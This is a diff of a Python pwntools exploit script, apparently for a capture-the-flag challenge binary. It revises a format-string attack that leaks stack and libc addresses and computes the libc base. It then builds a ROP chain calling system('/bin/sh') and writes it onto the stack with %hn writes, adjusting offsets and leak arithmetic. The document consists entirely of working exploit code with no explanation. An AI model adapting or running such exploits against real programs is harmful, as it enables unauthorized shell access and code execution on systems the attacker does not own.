@@ -2,6 +2,7 @@
 from pwn import *
 
 name = './a.out_patched'
+# name = './a.out'
 elf = context.binary = ELF(name)
 libc = elf.libc
 context.update(
@@ -40,7 +41,7 @@ def start():
         return pp
     elif args.GDB:
         c = '''
-        break-rva 0x0000000000001181
+        b *main+111
         c
         '''
         return gdb.debug([elf.path], c)
@@ -55,16 +56,16 @@ p = start()
 
 leak = hleak(rcn(14))
 
-sl(b"%137c%16$hhn|%45$p|%47$p|".ljust(32,b'a')+p64(leak-0x18))
+sl(b"%121c%12$hhn|%43$p|%45$p|".ljust(32,b'a')+p64(leak-0x18))
 
 rcu(b'|')
 ll = hleak(rcu(b'|'))
 pp = hleak(rcu(b'|'))
 
-libc.address = ll - 0x2a578 #0x29ca8
+logi('test', libc.sym.__libc_start_main)
+libc.address = ll - libc.sym.__libc_start_main + 0x38 #0x2a578 #0x29ca8
 logi('libc', libc.address)
 
-logi('test', libc.sym.__libc_start_main)
 
 rop = ROP(libc)
 rop.system(next(libc.search(b'/bin/sh\x00')))
@@ -84,9 +85,9 @@ for i in range(len(xxx) - 8, -1, -8):
     print(idx)
 
     writes = [
-        (x1, 31 + idx),
-        (x2, 30 + idx),
-        (x3, 29 + idx),
+        (x1, 27 + idx),
+        (x2, 26 + idx),
+        (x3, 25 + idx),
     ]
 
     sorted_writes = sorted(writes, key=lambda w: w[0])
@@ -96,7 +97,7 @@ for i in range(len(xxx) - 8, -1, -8):
     for val, pos in sorted_writes:
         inc = (val - printed) & 0xffff
         if inc > 0:
-            if pos == 37:
+            if pos == 33:
                 pl += f"%{inc}c%{pos}$n".encode()
             else:
                 pl += f"%{inc}c%{pos}$hn".encode()
@@ -109,9 +110,9 @@ for i in range(len(xxx) - 8, -1, -8):
     payload += pl
 
 payload = payload.ljust(136, b'a') 
+payload += p64(leak - 0x140) + p64(leak - 0x140 + 2) + p64(leak - 0x140 + 4)
+payload += p64(leak - 0x138) + p64(leak - 0x138 + 2) + p64(leak - 0x138 + 4)
 payload += p64(leak - 0x130) + p64(leak - 0x130 + 2) + p64(leak - 0x130 + 4)
-payload += p64(leak - 0x128) + p64(leak - 0x128 + 2) + p64(leak - 0x128 + 4)
-payload += p64(leak - 0x120) + p64(leak - 0x120 + 2) + p64(leak - 0x120 + 4)
 
 print(rop.dump())
 
